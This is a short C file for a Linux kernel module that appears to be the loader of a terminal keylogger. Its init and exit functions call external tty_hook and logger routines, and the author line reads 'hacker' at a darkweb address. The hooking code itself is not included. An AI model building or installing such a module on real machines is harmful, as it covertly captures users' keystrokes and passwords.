#include <linux/module.h>
#include <linux/kernel.h>

extern int init_logger(void);
extern void remove_logger(void);

int tty_hook(void);
void tty_unhook(void);

static int __init hook_init(void)
{
	printk("Hello World!");
	init_logger();

	tty_hook();
	return 0;
}

static void __exit hook_exit(void)
{
	printk("Bye World..");
	remove_logger();
	tty_unhook();
}

module_init(hook_init);
module_exit(hook_exit);

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("hacker <hacker@darkweb.net>");
